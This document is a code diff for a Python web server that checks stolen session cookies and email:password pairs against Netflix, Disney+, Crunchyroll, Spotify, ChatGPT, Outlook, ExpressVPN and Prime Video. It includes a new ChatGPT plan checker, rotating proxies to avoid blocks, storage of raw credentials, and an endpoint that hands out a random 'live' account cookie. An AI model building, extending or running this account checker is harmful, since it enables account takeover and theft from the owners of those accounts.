+                        mark_proxy_cooldown(proxy_raw_url, 600)
+                    if attempt_direct_fallback and use_proxy:
+                        session.proxies = {}
+                        result["route"] = "Direct"
+                        proxy_raw_url = None
+                        return do_request(attempt_direct_fallback=False)
+
+                # 401 = token revoked/invalidated → DEAD cookie
+                if resp_check.status_code == 401:
+                    result["status"] = "DEAD"
+                    result["email"] = email
+                    result["reason"] = "Token revoked / invalidated"
+                    try:
+                        err_data = resp_check.json()
+                        err_msg = err_data.get("error", {}).get("message", "")
+                        err_code = err_data.get("error", {}).get("code", "")
+                        if err_msg:
+                            result["reason"] = f"{err_code}: {err_msg}" if err_code else err_msg
+                    except Exception:
+                        pass
+                    return result
+
+                subscription_plan = ""
+                plan_type = ""
+                plan_display_name = ""
+                has_plus = False
+                is_paid = False
+
+                if resp_check.status_code == 200:
+                    # Parse JSON properly instead of regex to avoid wrong field capture
+                    try:
+                        check_data = resp_check.json()
+                    except (json.JSONDecodeError, ValueError):
+                        check_data = {}
+
+                    # The accounts/check response structure:
+                    # {"accounts": {"acc-id": {"account": {..., "plan_type": "free", "plan_display_name": "Free"}, "entitlement": {"subscription_plan": "...", ...}, ...}}}
+                    # IMPORTANT: entitlement.subscription_plan can be "chatgptplusplan" even for FREE users
+                    # (remnant from cancelled subscription). The ACCURATE source is account.plan_type.
+                    if isinstance(check_data, dict):
+                        accounts = check_data.get("accounts", {})
+                        if isinstance(accounts, dict):
+                            for acc_key, acc_val in accounts.items():
+                                if not isinstance(acc_val, dict):
+                                    continue
+                                # PRIMARY SOURCE: account.plan_type (most accurate)
+                                acct = acc_val.get("account", {})
+                                if isinstance(acct, dict):
+                                    plan_type = plan_type or acct.get("plan_type", "")
+                                    plan_display_name = plan_display_name or acct.get("plan_display_name", "")
+                                    is_paid = is_paid or bool(acct.get("is_paid", False))
+                                # SECONDARY: entitlement (only trust subscription_plan if plan_type is absent)
+                                ent = acc_val.get("entitlement", {})
+                                if isinstance(ent, dict):
+                                    if not plan_type:
+                                        subscription_plan = subscription_plan or ent.get("subscription_plan", "")
+                                    has_plus = has_plus or bool(ent.get("has_active_subscription", False))
+
+                    # If JSON parse found nothing, try regex as last resort
+                    if not plan_type and not subscription_plan:
+                        check_text = resp_check.text
+                        # Try plan_type first (accurate)
+                        pt_match = re.search(r'"plan_type"\s*:\s*"([^"]+)"', check_text)
+                        if pt_match:
+                            plan_type = pt_match.group(1)
+                        else:
+                            sp_match = re.search(r'"subscription_plan"\s*:\s*"([^"]+)"', check_text)
+                            if sp_match:
+                                subscription_plan = sp_match.group(1)
+
+                # Also extract planType from auth/session response (another reliable source)
+                auth_plan_type = ""
+                auth_account = auth_data.get("account", {})
+                if isinstance(auth_account, dict):
+                    auth_plan_type = auth_account.get("planType", "")
+
+                # Use plan_type as the authoritative plan indicator
+                # plan_type values: "free", "plus", "pro", "team", "enterprise"
+                effective_plan = plan_type or auth_plan_type or ""
+
+                result["subscription_plan"] = effective_plan or subscription_plan
+
+                # Debug: include raw API responses for troubleshooting
+                result["_debug"] = {
+                    "auth_status": resp_auth.status_code,
+                    "auth_keys": list(auth_data.keys()) if isinstance(auth_data, dict) else str(type(auth_data)),
+                    "check_status": resp_check.status_code,
+                    "subscription_plan": subscription_plan,
+                    "plan_type": plan_type,
+                    "has_plus": has_plus,
+                    "is_paid": is_paid,
+                    "check_body_preview": resp_check.text[:500] if resp_check.status_code == 200 else f"HTTP {resp_check.status_code}"
+                }
+
+                # If accounts/check failed (non-200), use auth/session planType as fallback
+                if resp_check.status_code != 200 and not subscription_plan:
+                    if auth_plan_type:
+                        ep_lower_fb = auth_plan_type.lower()
+                        if ep_lower_fb == "free":
+                            result["status"] = "FREE"
+                            result["plan"] = "ChatGPT Free"
+                            result["is_paid"] = False
+                        else:
+                            result["status"] = "LIVE"
+                            result["plan"] = f"ChatGPT {auth_plan_type.title()}"
+                            result["is_paid"] = True
+                    else:
+                        result["status"] = "FREE"
+                        result["plan"] = "ChatGPT Free"
+                        result["is_paid"] = False
+                    return result
+
+                # Status logic — use effective_plan (plan_type) as primary indicator
+                # plan_type values: "free", "plus", "pro", "team", "enterprise"
+                ep_lower = effective_plan.lower().strip() if effective_plan else ""
+
+                if ep_lower == "free":
+                    result["status"] = "FREE"
+                    result["plan"] = plan_display_name or "ChatGPT Free"
+                    result["is_paid"] = False
+                elif ep_lower == "plus":
+                    result["status"] = "LIVE"
+                    result["plan"] = plan_display_name or "ChatGPT Plus"
+                    result["is_paid"] = True
+                elif ep_lower == "pro":
+                    result["status"] = "LIVE"
+                    result["plan"] = plan_display_name or "ChatGPT Pro"
+                    result["is_paid"] = True
+                elif ep_lower == "team":
+                    result["status"] = "LIVE"
+                    result["plan"] = plan_display_name or "ChatGPT Team"
+                    result["is_paid"] = True
+                elif ep_lower == "enterprise":
+                    result["status"] = "LIVE"
+                    result["plan"] = plan_display_name or "ChatGPT Enterprise"
+                    result["is_paid"] = True
+                elif effective_plan:
+                    # Unknown plan_type string
+                    result["status"] = "LIVE" if (is_paid or has_plus) else "FREE"
+                    result["plan"] = plan_display_name or effective_plan
+                    result["is_paid"] = is_paid or has_plus
+                elif subscription_plan:
+                    # Fallback to entitlement subscription_plan (less reliable)
+                    sp_lower = subscription_plan.lower()
+                    if sp_lower == "chatgptfreeplan":
+                        result["status"] = "FREE"
+                        result["plan"] = "ChatGPT Free"
+                        result["is_paid"] = False
+                    elif "plus" in sp_lower:
+                        result["status"] = "LIVE"
+                        result["plan"] = "ChatGPT Plus"
+                        result["is_paid"] = True
+                    elif "pro" in sp_lower:
+                        result["status"] = "LIVE"
+                        result["plan"] = "ChatGPT Pro"
+                        result["is_paid"] = True
+                    elif "team" in sp_lower:
+                        result["status"] = "LIVE"
+                        result["plan"] = "ChatGPT Team"
+                        result["is_paid"] = True
+                    else:
+                        result["status"] = "LIVE" if (is_paid or has_plus) else "FREE"
+                        result["plan"] = subscription_plan
+                        result["is_paid"] = is_paid or has_plus
+                else:
+                    # No plan info at all but valid token
+                    if is_paid or has_plus:
+                        result["status"] = "LIVE"
+                        result["plan"] = "ChatGPT Paid"
+                        result["is_paid"] = True
+                    else:
+                        result["status"] = "FREE"
+                        result["plan"] = "ChatGPT Free"
+                        result["is_paid"] = False
+
+                return result
+
+            except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout,
+                    requests.exceptions.ConnectionError) as e:
+                if attempt_direct_fallback and use_proxy:
+                    if proxy_raw_url:
+                        mark_proxy_cooldown(proxy_raw_url, 600)
+                    session.proxies = {}
+                    result["route"] = "Direct"
+                    proxy_raw_url = None
+                    return do_request(attempt_direct_fallback=False)
+                result["status"] = "ERROR"
+                result["reason"] = f"Connection error: {str(e)[:120]}"
+                return result
+
+            except requests.exceptions.Timeout as e:
+                if attempt_direct_fallback and use_proxy:
+                    if proxy_raw_url:
+                        mark_proxy_cooldown(proxy_raw_url, 600)
+                    session.proxies = {}
+                    result["route"] = "Direct"
+                    proxy_raw_url = None
+                    return do_request(attempt_direct_fallback=False)
+                result["status"] = "ERROR"
+                result["reason"] = f"Timeout: {str(e)[:120]}"
+                return result
+
+        result = do_request()
+
+        save_history(
+            "openai", result["status"],
+            plan=result.get("plan", ""),
+            country="",
+            route=result["route"],
+            raw_cookie=cookie_text,
+            email=result.get("email", "")
+        )
+
+        return result
+
+    except Exception as e:
+        result["status"] = "ERROR"
+        result["reason"] = f"Unhandled exception: {str(e)[:200]}"
+        try:
+            save_history("openai", "ERROR", route=result.get("route", "Direct"), raw_cookie=cookie_text, email="")
+        except Exception:
+            pass
+        return result
+
+
 # In-memory sliding window rate limiter
 rate_limit_lock = threading.Lock()
 ip_request_history = {}
@@ -2922,8 +4012,59 @@ def is_rate_limited(ip, max_requests=40, window_seconds=10, bucket="default"):
         ip_request_history[key] = timestamps
         return False
 
+active_dashboard_tokens = {}
+dashboard_token_lock = threading.Lock()
+
+def create_dashboard_session_token(ttl_seconds=86400):
+    import secrets
+    token = secrets.token_hex(24)
+    with dashboard_token_lock:
+        now = time.time()
+        expired = [t for t, exp in active_dashboard_tokens.items() if exp < now]
+        for t in expired:
+            active_dashboard_tokens.pop(t, None)
+        active_dashboard_tokens[token] = now + ttl_seconds
+    return token
+
+def check_dashboard_token_authorized(headers):
+    token = headers.get('X-Dashboard-Token') or ''
+    if not token:
+        auth = headers.get('Authorization', '')
+        if auth.startswith('Token '):
+            token = auth[6:].strip()
+    if not token:
+        return False
+    with dashboard_token_lock:
+        exp = active_dashboard_tokens.get(token)
+        if exp and exp > time.time():
+            return True
+        elif exp:
+            active_dashboard_tokens.pop(token, None)
+    return False
+
+def check_authorized_client(headers):
+    """Returns True if request has valid API key OR valid Dashboard PIN session token."""
+    if check_api_key_authorized(headers):
+        return True
+    if check_dashboard_token_authorized(headers):
+        return True
+    return False
+
+_api_key_last_touched = {}  # key_id -> timestamp
+
+def touch_api_key(key_id):
+    now = time.time()
+    last = _api_key_last_touched.get(key_id, 0)
+    if now - last > 60:
+        _api_key_last_touched[key_id] = now
+        now_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        queue_db_write("touch_api_key", {
+            "id": key_id,
+            "last_used": now_str
+        })
+
 def check_api_key_authorized(headers):
-    # Check X-API-Key header or Authorization: Bearer <key>
+    # Check X-API-Key header or Authorization: Bearer ***
     key = headers.get('X-API-Key') or ''
     if not key:
         auth = headers.get('Authorization', '')
@@ -2931,16 +4072,128 @@ def check_api_key_authorized(headers):
             key = auth[7:].strip()
     if not key:
         return False
-    with db_lock:
+
+    # Check against master key in config if defined
+    try:
+        cfg = get_config()
+        master_key = cfg.get('api_key', '')
+        if master_key and hmac.compare_digest(key, master_key):
+            return True
+    except Exception:
+        pass
+
+    try:
         conn = get_db()
         c = conn.cursor()
         c.execute('SELECT id FROM api_keys WHERE key = ? AND is_active = 1', (key,))
         row = c.fetchone()
-        if row:
-            c.execute('UPDATE api_keys SET last_used = ? WHERE id = ?', (datetime.now().strftime('%Y-%m-%d %H:%M:%S'), row[0]))
-            conn.commit()
         conn.close()
-        return row is not None
+        if row:
+            touch_api_key(row[0])
+            return True
+    except Exception as e:
+        logging.error(f"Error checking API key authorization: {e}")
+    return False
+
+def recheck_history_item(record_id, use_proxy=True):
+    """Re-check a history record's cookie/credential to update its status (LIVE/DEAD/HOLD)."""
+    conn = get_db()
+    c = conn.cursor()
+    c.execute('SELECT id, type, status, raw_cookie, email FROM history WHERE id = ?', (record_id,))
+    row = c.fetchone()
+    conn.close()
+    if not row:
+        return {"error": "Record not found", "id": record_id}
+
+    rec_id, rec_type, old_status, raw_cookie, rec_email = row
+    rec_type = (rec_type or "").lower()
+    if not raw_cookie:
+        return {"error": "No raw cookie/credential stored for this record", "id": rec_id}
+
+    new_status = "ERROR"
+    out = {}
+    _recheck_mode.active = True
+    try:
+        if rec_type in ('netflix', 'single', 'bulk'):
+            out = check_netflix_membership(raw_cookie, use_proxy=use_proxy)
+            new_status = out.get('status', 'ERROR')
+        elif rec_type == 'disney' and ':' not in raw_cookie[:100]:
+            out = check_disney_cookie(raw_cookie, use_proxy=use_proxy)
+            new_status = out.get('status', 'ERROR')
+        elif rec_type == 'disney':
+            parts = raw_cookie.split(':', 1)
+            if len(parts) == 2:
+                out = check_disney_account(parts[0].strip(), parts[1].strip(), use_proxy=use_proxy)
+            else:
+                out = check_disney_cookie(raw_cookie, use_proxy=use_proxy)
+            new_status = out.get('status', 'ERROR')
+        elif rec_type == 'crunchyroll' and ':' not in raw_cookie[:100]:
+            out = check_crunchyroll_cookie(raw_cookie, use_proxy=use_proxy)
+            new_status = out.get('status', 'ERROR')
+        elif rec_type == 'crunchyroll':
+            parts = raw_cookie.split(':', 1)
+            if len(parts) == 2:
+                out = check_crunchyroll_account(parts[0].strip(), parts[1].strip(), use_proxy=use_proxy)
+            else:
+                out = check_crunchyroll_cookie(raw_cookie, use_proxy=use_proxy)
+            new_status = out.get('status', 'ERROR')
+        elif rec_type == 'spotify':
+            out = check_spotify_cookie(raw_cookie, use_proxy=use_proxy)
+            new_status = out.get('status', 'ERROR')
+        elif rec_type == 'openai':
+            out = check_openai_cookie(raw_cookie, use_proxy=use_proxy)
+            new_status = out.get('status', 'ERROR')
+        elif rec_type in ('outlook', 'hotmail'):
+            parts = raw_cookie.split(':', 1)
+            if len(parts) == 2:
+                out = check_outlook_account(parts[0].strip(), parts[1].strip(), use_proxy=use_proxy)
+                new_status = out.get('status', 'ERROR')
+            else:
+                return {"error": "Invalid credential format for outlook", "id": rec_id}
+        elif rec_type == 'expressvpn':
+            parts = raw_cookie.split(':', 1)
+            if len(parts) == 2:
+                def _evpn_proxy_fn():
+                    prx, label, raw = get_random_proxy()
+                    if prx:
+                        return prx.get('http') or prx.get('https')
+                    return None
+                out = check_expressvpn_account(parts[0].strip(), parts[1].strip(), use_proxy=use_proxy, get_proxy_fn=_evpn_proxy_fn, save_history_fn=save_history)
+                new_status = out.get('status', 'ERROR')
+            else:
+                return {"error": "Invalid credential format for expressvpn", "id": rec_id}
+        elif rec_type == 'primevideo':
+            out = check_primevideo_cookie(raw_cookie, use_proxy=use_proxy, get_proxy_fn=get_random_proxy, cooldown_fn=mark_proxy_cooldown, save_fn=save_history)
+            new_status = out.get('status', 'ERROR')
+        else:
+            return {"error": f"Unsupported service type: {rec_type}", "id": rec_id}
+    except Exception as e:
+        new_status = "ERROR"
+        out = {"error": str(e)}
+    finally:
+        _recheck_mode.active = False
+
+    # Map to LIVE/DEAD
+    status_upper = new_status.upper()
+    if status_upper in ("LIVE", "PREMIUM", "ACTIVE"):
+        final_status = "LIVE"
+    elif status_upper in ("DEAD", "EXPIRED", "INVALID", "ERROR"):
+        final_status = "DEAD"
+    elif status_upper == "HOLD":
+        final_status = "HOLD"
+    else:
+        final_status = new_status.upper()
+
+    # Update DB
+    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    queue_db_write("update_history_status", {
+        "id": rec_id,
+        "status": final_status,
+        "created_at": now
+    })
+
+    return {"id": rec_id, "old_status": old_status, "new_status": final_status, "type": rec_type, "detail": out}
+
 
 class Handler(http.server.BaseHTTPRequestHandler):
     def log_message(self, format, *args):
@@ -2990,7 +4243,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
             self.send_header("X-Content-Type-Options", "nosniff")
             self.send_header("X-Frame-Options", "DENY")
             self.end_headers()
-        elif path in ("/api/health", "/api/auth/status", "/api/proxies"):
+        elif path in ("/api/health", "/api/auth/status", "/api/proxies", "/api/dashboard-pin/status"):
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
             self.end_headers()
@@ -3003,6 +4256,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
         parsed = urllib.parse.urlparse(self.path)
         path = parsed.path
         qs = urllib.parse.parse_qs(parsed.query)
+        client_ip = self.client_address[0]
 
         if path in ("/", "/index.html"):
             html_file = os.path.join(os.path.dirname(__file__), "index.html")
@@ -3013,6 +4267,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 content = b"<h1>index.html not found</h1>"
             self.send_response(200)
             self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
             self.send_header("Content-Security-Policy", "default-src 'self' 'unsafe-inline' 'unsafe-eval' https://fonts.googleapis.com https://fonts.gstatic.com https://cdn.jsdelivr.net; img-src 'self' data:; connect-src 'self' https://*.trycloudflare.com https://*.sawavaganteng.cloud https://cdn.jsdelivr.net")
             self.send_header("X-Content-Type-Options", "nosniff")
             self.send_header("X-Frame-Options", "DENY")
@@ -3029,6 +4284,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 content = b"<h1>admin.html not found</h1>"
             self.send_response(200)
             self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
             self.send_header("Content-Security-Policy", "default-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self'")
             self.send_header("X-Content-Type-Options", "nosniff")
             self.send_header("X-Frame-Options", "DENY")
@@ -3044,6 +4300,76 @@ class Handler(http.server.BaseHTTPRequestHandler):
             self.send_cors_headers()
             self.end_headers()
             self.wfile.write(fav)
+
+        elif path.startswith("/static/"):
+            rel_path = path[len("/static/"):].lstrip("/\\")
+            static_dir = os.path.abspath(os.path.join(BASE_DIR, "static"))
+            safe_path = os.path.abspath(os.path.join(static_dir, rel_path))
+            if safe_path.startswith(static_dir) and os.path.isfile(safe_path):
+                ext = os.path.splitext(safe_path)[1].lower()
+                mime_types = {
+                    ".css": "text/css; charset=utf-8",
+                    ".js": "application/javascript; charset=utf-8",
+                    ".json": "application/json; charset=utf-8",
+                    ".svg": "image/svg+xml",
+                    ".png": "image/png",
+                    ".jpg": "image/jpeg",
+                    ".jpeg": "image/jpeg",
+                    ".ico": "image/x-icon",
+                    ".woff2": "font/woff2",
+                    ".woff": "font/woff",
+                    ".ttf": "font/ttf"
+                }
+                c_type = mime_types.get(ext, "application/octet-stream")
+                with open(safe_path, "rb") as f:
+                    data = f.read()
+                self.send_response(200)
+                self.send_header("Content-Type", c_type)
+                self.send_header("Cache-Control", "public, max-age=86400")
+                self.send_cors_headers()
+                self.end_headers()
+                self.wfile.write(data)
+                return
+            else:
+                self.send_response(404)
+                self.send_header("Content-Type", "text/plain")
+                self.end_headers()
+                self.wfile.write(b"404 Not Found")
+                return
+
+        elif path == "/manifest.json":
+            m_path = os.path.join(BASE_DIR, "manifest.json")
+            if os.path.isfile(m_path):
+                with open(m_path, "rb") as f:
+                    m_data = f.read()
+                self.send_response(200)
+                self.send_header("Content-Type", "application/manifest+json; charset=utf-8")
+                self.send_header("Cache-Control", "public, max-age=86400")
+                self.send_cors_headers()
+                self.end_headers()
+                self.wfile.write(m_data)
+                return
+            else:
+                self.send_response(404)
+                self.end_headers()
+                return
+
+        elif path == "/sw.js":
+            sw_path = os.path.join(BASE_DIR, "sw.js")
+            if os.path.isfile(sw_path):
+                with open(sw_path, "rb") as f:
+                    sw_data = f.read()
+                self.send_response(200)
+                self.send_header("Content-Type", "application/javascript; charset=utf-8")
+                self.send_header("Cache-Control", "no-cache")
+                self.send_cors_headers()
+                self.end_headers()
+                self.wfile.write(sw_data)
+                return
+            else:
+                self.send_response(404)
+                self.end_headers()
+                return
 
         elif path == "/api/health":
             uptime = int(time.time() - server_start_time)
@@ -3070,10 +4396,20 @@ class Handler(http.server.BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(json.dumps({"authenticated": is_authed, "method": "api_key"}).encode("utf-8"))
 
+        elif path == "/api/dashboard-pin/status":
+            cfg = get_config()
+            pin_set = bool(cfg.get("dashboard_pin", ""))
+            self.send_response(200)
+            self.send_header("Content-Type", "application/json")
+            self.send_cors_headers()
+            self.end_headers()
+            self.wfile.write(json.dumps({"enabled": pin_set}).encode("utf-8"))
+
         elif path == "/api/proxies":
+            # Load proxies outside proxy_lock to avoid lock inversion deadlock
+            # (load_proxies acquires cached_proxies_lock -> proxy_lock)
+            load_proxies()
             with proxy_lock:
-                if not all_tested_proxies:
-                    all_tested_proxies = list(load_proxies())
                 total_n = len(all_tested_proxies)
                 h_count = len(healthy_proxies)
                 d_count = len([p for p in all_tested_proxies if p.get("status") == "FAIL"])
@@ -3092,31 +4428,69 @@ class Handler(http.server.BaseHTTPRequestHandler):
             }).encode("utf-8"))
 
         elif path in ('/api/account/random', '/api/random_account'):
+            # Rate limiting check: max 20 calls/min per client IP to prevent automated scraping
+            if is_rate_limited(client_ip, max_requests=20, window_seconds=60, bucket="account_random"):
+                self.send_response(429)
+                self.send_header("Content-Type", "application/json")
+                self.send_header("Retry-After", "30")
+                self.send_cors_headers()
+                self.end_headers()
+                self.wfile.write(json.dumps({
+                    "success": False,
+                    "error": "Rate limit exceeded: Terlalu banyak permintaan akun. Silakan coba sesaat lagi."
+                }).encode("utf-8"))
+                return
+
+            # Security Authorization Check: Valid API Key OR Dashboard Session Token required
+            if not check_authorized_client(self.headers):
+                self.send_response(401)
+                self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
+                self.end_headers()
+                self.wfile.write(json.dumps({
+                    "success": False,
+                    "error": "Unauthorized: API Key atau Dashboard Session diperlukan untuk mengambil akun live."
+                }).encode("utf-8"))
+                return
+
             svc = qs.get("service", qs.get("type", ["netflix"]))[0].lower().strip()
 
-            with db_lock:
-                conn = get_db()
-                c = conn.cursor()
-                if svc in ('netflix', 'checker', 'single', 'bulk'):
-                    c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type IN ('checker', 'netflix', 'single', 'bulk') AND status = 'LIVE' ORDER BY RANDOM() LIMIT 1;")
-                elif svc in ('expressvpn', 'evpn'):
-                    c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type = 'expressvpn' AND status IN ('LIVE', 'PREMIUM', 'FREE') ORDER BY RANDOM() LIMIT 1;")
-                elif svc in ('disney', 'disneyplus'):
-                    c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type = 'disney' AND status IN ('LIVE', 'PREMIUM') ORDER BY RANDOM() LIMIT 1;")
-                elif svc in ('crunchyroll', 'cr'):
-                    c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type = 'crunchyroll' AND status IN ('LIVE', 'PREMIUM') ORDER BY RANDOM() LIMIT 1;")
-                elif svc in ('spotify', 'sp'):
-                    c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type = 'spotify' AND status IN ('LIVE', 'PREMIUM') ORDER BY RANDOM() LIMIT 1;")
-                elif svc in ('outlook', 'hotmail', 'ms'):
-                    c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type IN ('outlook', 'hotmail') AND status IN ('LIVE', 'PREMIUM') ORDER BY RANDOM() LIMIT 1;")
-                else:
-                    c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE status IN ('LIVE', 'PREMIUM') ORDER BY RANDOM() LIMIT 1;")
-                row = c.fetchone()
-                conn.close()
+            conn = get_db()
+            c = conn.cursor()
+            if svc in ('netflix', 'checker', 'single', 'bulk'):
+                c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type = 'netflix' AND status = 'LIVE' ORDER BY RANDOM() LIMIT 1;")
+            elif svc in ('expressvpn', 'evpn'):
+                c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type = 'expressvpn' AND status IN ('LIVE', 'PREMIUM', 'FREE') ORDER BY RANDOM() LIMIT 1;")
+            elif svc in ('disney', 'disneyplus'):
+                c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type = 'disney' AND status IN ('LIVE', 'PREMIUM') ORDER BY RANDOM() LIMIT 1;")
+            elif svc in ('crunchyroll', 'cr'):
+                c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type = 'crunchyroll' AND status IN ('LIVE', 'PREMIUM') ORDER BY RANDOM() LIMIT 1;")
+            elif svc in ('spotify', 'sp'):
+                c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type = 'spotify' AND status IN ('LIVE', 'PREMIUM') ORDER BY RANDOM() LIMIT 1;")
+            elif svc in ('outlook', 'hotmail', 'ms'):
+                c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type IN ('outlook', 'hotmail') AND status IN ('LIVE', 'PREMIUM') ORDER BY RANDOM() LIMIT 1;")
+            elif svc in ('openai', 'chatgpt', 'gpt'):
+                c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type = 'openai' AND status IN ('LIVE', 'PREMIUM', 'FREE') ORDER BY RANDOM() LIMIT 1;")
+            elif svc in ('primevideo', 'pv', 'amazon'):
+                c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE type = 'primevideo' AND status IN ('LIVE', 'PREMIUM') ORDER BY RANDOM() LIMIT 1;")
+            else:
+                c.execute("SELECT id, type, status, email, raw_cookie, token_url, plan, country FROM history WHERE status IN ('LIVE', 'PREMIUM') ORDER BY RANDOM() LIMIT 1;")
+            row = c.fetchone()
+            conn.close()
 
             if row:
                 r_id, r_type, r_status, r_email, r_cookie, r_token, r_plan, r_country = row
                 content_to_copy = r_cookie or r_token or r_email
+                # Mask email for safe presentation
+                email_masked = "-"
+                if r_email and "@" in r_email:
+                    parts = r_email.split("@", 1)
+                    u, d = parts[0], parts[1]
+                    masked_u = (u[:2] + "****" + u[-1:]) if len(u) > 3 else (u[:1] + "***")
+                    email_masked = f"{masked_u}@{d}"
+                elif r_email:
+                    email_masked = r_email
+
                 self.send_response(200)
                 self.send_header('Content-Type', 'application/json')
                 self.send_cors_headers()
@@ -3127,6 +4501,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
                     "service": r_type,
                     "status": r_status,
                     "email": r_email,
+                    "email_masked": email_masked,
                     "content": content_to_copy,
                     "plan": r_plan or "Active",
                     "country": r_country or "-"
@@ -3153,7 +4528,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(json.dumps({
                 "status_counts": an.get("status_counts", {}),
-                "services": an.get("services", {}),
+                "services": an.get("services_detail", an.get("services", {})),
                 "proxy": {"total": p_total, "healthy": p_healthy}
             }).encode('utf-8'))
 
@@ -3166,19 +4541,19 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 'version': '8.0.0',
                 'codename': 'Fortress',
                 'auth': 'api_key',
-                'services': ['netflix', 'disney', 'disney-cookie', 'crunchyroll', 'crunchyroll-cookie', 'expressvpn', 'spotify', 'outlook', 'hotmail'],
+                'services': ['netflix', 'disney', 'disney-cookie', 'crunchyroll', 'crunchyroll-cookie', 'expressvpn', 'spotify', 'outlook', 'hotmail', 'openai'],
                 'python': platform.python_version(),
                 'uptime': int(time.time() - server_start_time)
             }).encode('utf-8'))
 
-        elif path in ("/api/history", "/api/history/export_csv", "/api/analytics", "/api/proxies/detail", "/api/proxies/export"):
-            # API key required for data/history endpoints
-            if not check_api_key_authorized(self.headers):
+        elif path in ("/api/history", "/api/history/export_csv", "/api/analytics", "/api/proxies/detail", "/api/proxies/export", "/api/proxies/provider-config", "/api/notifications/config"):
+            # API key or active Dashboard Session required for data/history endpoints
+            if not check_authorized_client(self.headers):
                 self.send_response(401)
                 self.send_header("Content-Type", "application/json")
                 self.send_cors_headers()
                 self.end_headers()
-                self.wfile.write(b'{"error": "Unauthorized: API Key required"}')
+                self.wfile.write(b'{"error": "Unauthorized: API Key or Dashboard Session required"}')
                 return
 
             if path == "/api/history":
@@ -3204,7 +4579,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 csv_data = export_history_csv(search=search, status=status, plan=plan, entry_type=entry_type)
                 self.send_response(200)
                 self.send_header("Content-Type", "text/csv; charset=utf-8")
-                self.send_header("Content-Disposition", f"attachment; filename=suite_history_{int(time.time())}.csv")
+                self.send_header("Content-Disposition", f"attachment; filename=history_{int(time.time())}.csv")
                 self.send_cors_headers()
                 self.end_headers()
                 self.wfile.write(csv_data.encode("utf-8"))
@@ -3223,22 +4598,32 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 status_filter = qs.get("status", ["ALL"])[0].upper().strip()
                 search_q = qs.get("search", [""])[0].lower().strip()
 
+                load_proxies()  # Pre-load outside lock to avoid deadlock
+                now = time.time()
                 with proxy_lock:
-                    if not all_tested_proxies:
-                        all_tested_proxies = load_proxies()
                     total_all = len(all_tested_proxies)
                     healthy_all = len(healthy_proxies)
-                    dead_items = [p for p in all_tested_proxies if p.get("status") == "FAIL"]
+                    dead_items = [p for p in all_tested_proxies if p.get("status") in ("FAIL", "DEAD")]
                     dead_all = len(dead_items)
-                    unverified_all = max(0, total_all - (healthy_all + dead_all))
+                    with proxy_cooldown_lock:
+                        cooldown_items = [
+                            p for p in all_tested_proxies
+                            if p.get("status") == "COOLDOWN"
+                            or proxy_cooldown.get(p.get("proxy", ""), 0) > now
+                            or p.get("cooldown_until", 0) > now
+                        ]
+                    cooldown_all = len(cooldown_items)
+                    unverified_all = max(0, total_all - (healthy_all + dead_all + cooldown_all))
                     active_all = healthy_all if healthy_all > 0 else (total_all - dead_all)
 
                     if status_filter in ("OK", "LIVE"):
                         source_list = healthy_proxies
                     elif status_filter in ("FAIL", "DEAD"):
                         source_list = dead_items
+                    elif status_filter in ("COOLDOWN", "HOLD"):
+                        source_list = cooldown_items
                     elif status_filter in ("UNVERIFIED", "UNTESTED", "READY"):
-                        source_list = [p for p in all_tested_proxies if p.get("status") in ("UNVERIFIED", "UNTESTED", "READY")]
+                        source_list = [p for p in all_tested_proxies if p.get("status") in ("UNVERIFIED", "UNTESTED", "READY") and p not in cooldown_items]
                     else:
                         source_list = all_tested_proxies
 
@@ -3257,7 +4642,18 @@ class Handler(http.server.BaseHTTPRequestHandler):
                     page = min(page, total_pages)
                     start_idx = (page - 1) * limit
                     end_idx = start_idx + limit
-                    items_page = filtered[start_idx:end_idx]
+                    raw_items_page = filtered[start_idx:end_idx]
+
+                    items_page = []
+                    with proxy_cooldown_lock:
+                        for p in raw_items_page:
+                            p_copy = dict(p)
+                            cd_end = max(p.get("cooldown_until", 0), proxy_cooldown.get(p.get("proxy", ""), 0))
+                            rem = max(0, int(cd_end - now))
+                            p_copy["cooldown_remaining"] = rem
+                            if rem > 0:
+                                p_copy["status"] = "COOLDOWN"
+                            items_page.append(p_copy)
 
                 with proxy_test_lock:
                     t_info = dict(proxy_test_state)
@@ -3270,9 +4666,15 @@ class Handler(http.server.BaseHTTPRequestHandler):
 
                 res_payload = {
                     "total": total_all,
+                    "healthy": healthy_all,
